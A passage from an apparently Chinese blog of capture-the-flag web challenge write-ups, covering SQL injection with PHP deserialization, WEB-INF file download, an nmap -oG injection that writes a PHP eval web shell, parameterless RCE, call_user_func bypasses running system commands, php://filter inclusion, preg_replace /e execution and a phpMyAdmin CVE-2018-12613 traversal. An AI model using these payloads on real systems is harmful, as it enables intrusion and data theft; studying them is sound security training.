class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;evo1ution&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;<span class="comment">//报错中出现 /var/www/html/view.php，故可知flag.php文件位置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改后得到<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:9:&quot;evo1ution&quot;;s:3:&quot;age&quot;;i:10;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>在页面源码的<code>iframe</code>获得base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s2NzYyOGIyOS05MTY3LTQ2MGItYTEzMi05YTZiNTY2ZTc1NjV9IjsNCmV4aXQoMCk7DQo=</span><br></pre></td></tr></table></figure><p>解码后</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;67628b29-9167-460b-a132-9a6b566e7565&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>点击<code>help</code>发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5ee09234-7e7f-446a-ad21-604cfd607d7f.node4.buuoj.cn:81/Download?filename=help.docx</span><br><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><p>用<code>post</code>传<code>filename=help.docx</code>下载得到<code>help.docx</code></p><p>![](D:&#x2F;MyBlog&#x2F;Blogs&#x2F;buuPics&#x2F;[RoarCTF 2019]Easy Java.png)</p><p>尝试<code>filename=/WEB-INF/web.xml</code>得到</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p> WEB-INF主要包含以下文件或目录：<br> &#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br> &#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br> &#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br> &#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。<br> &#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p></blockquote><p>使用<code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>得到</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;FlagController&quot;)</span></span><br><span class="line"><span class="comment">/* renamed from: FlagController  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagController</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;ZmxhZ3swNzc5OTY5NC05ZGE3LTQwNmEtYTExMC1kNjAzMmZkNzNiYWF9Cg==&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        httpServletResponse.getWriter().print(<span class="string">&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解码其中的<code>ZmxhZ3swNzc5OTY5NC05ZGE3LTQwNmEtYTExMC1kNjAzMmZkNzNiYWF9Cg==</code>即可</p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>打开获得源码，<code>payload</code>如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure><p>然后蚁剑连接即可，目录为md5值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://e4c67e98-af95-4fe1-bbc4-ed2af50839e7.node4.buuoj.cn:81/66be3929475684f026651c8f42e8831e/1.php</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p></blockquote><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>模板注入</p><p>![](D:&#x2F;MyBlog&#x2F;Blogs&#x2F;buuPics&#x2F;[BJDCTF2020]The mystery of ip.png)</p><blockquote><p><a href="https://imququ.com/post/x-forwarded-for-header-in-http.html">HTTP 请求头中的 X-Forwarded-For</a></p></blockquote><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>使用<code>dirsearch</code>扫描后发现可能有<code>git</code>源码泄露，使用<a href="https://github.com/lijiejie/GitHack">GitHack</a>下载得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到禁用了一些函数，并且从第三个<code>if</code>可以看出是<a href="https://blog.csdn.net/Manuffer/article/details/120738755">无参数RCE</a></p><h3 id="法一-array-reverse"><a href="#法一-array-reverse" class="headerlink" title="法一 array_reverse()"></a>法一 array_reverse()</h3><p>构造<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看flag.php位置</span><br><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br><span class="line">#查看flag</span><br><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="法二-session-id"><a href="#法二-session-id" class="headerlink" title="法二 session_id()"></a>法二 session_id()</h3><p>开启<code>burp</code>，地址栏输入<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>添加<code>Cookie</code>后放行即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/l2872253606/article/details/125246229">[GXYCTF2019]禁止套娃–详解</a></p></blockquote><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>抓包修改<code>post</code>参数后从报错中发现使用了<code>call_user_func()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning:  call_user_func() expects parameter 1 to be a valid callback, function &#x27;echo&#x27; not found or invalid function name in /var/www/html/index.php on line 24</span><br></pre></td></tr></table></figure><p>测试后发现禁用了很多函数，不过<code>file_get_contents</code>可以用，获得<code>index.php</code>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span>=<span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,<span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="法一-绕过"><a href="#法一-绕过" class="headerlink" title="法一 \绕过"></a>法一 \绕过</h3><p><code>payload</code>如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看当前目录    bg.jpg index.php index.php</span><br><span class="line">func=\system&amp;p=ls</span><br><span class="line">#查看根目录 </span><br><span class="line">func=\system&amp;p=ls /</span><br><span class="line">#查看tmp目录    flagoefiu4r93 pear pear</span><br><span class="line">func=\system&amp;p=ls /tmp</span><br><span class="line">#查看flag</span><br><span class="line">func=\system&amp;p=cat /tmp/flagoefiu4r93</span><br><span class="line">#也可以直接用find查找flag所在目录</span><br><span class="line">func=\system&amp;p=find / -name flag*</span><br></pre></td></tr></table></figure><h3 id="法二-反序列化"><a href="#法二-反序列化" class="headerlink" title="法二 反序列化"></a>法二 反序列化</h3><p>所用<code>exp</code>如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>payload</code>如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考: <a href="https://blog.csdn.net/snowlyzz/article/details/124697304">[网鼎杯 2020 朱雀组]之phpweb</a></p></blockquote><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>打开获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件包含，使用如下<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#url</span><br><span class="line">/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br><span class="line">#post数据</span><br><span class="line">I have a dream</span><br><span class="line">#也可以用data协议绕过文件内容验证</span><br><span class="line">/?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p>将得到的编码<code>base64</code>解码后得到<code>next.php</code>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用<a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() &#x2F;e代码执行漏洞</a>即可(也可以参考<a href="https://www.jb51.net/article/145649.htm">这篇文章</a>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>根据提示找到<code>phpmyadmin</code>页面，根据其版本<code>4.8.1</code>进行百度，发现<code>CVE-2018-12613</code>可用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/m0_47418965/article/details/121708917">最全phpmyadmin漏洞汇总</a></p></blockquote><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad 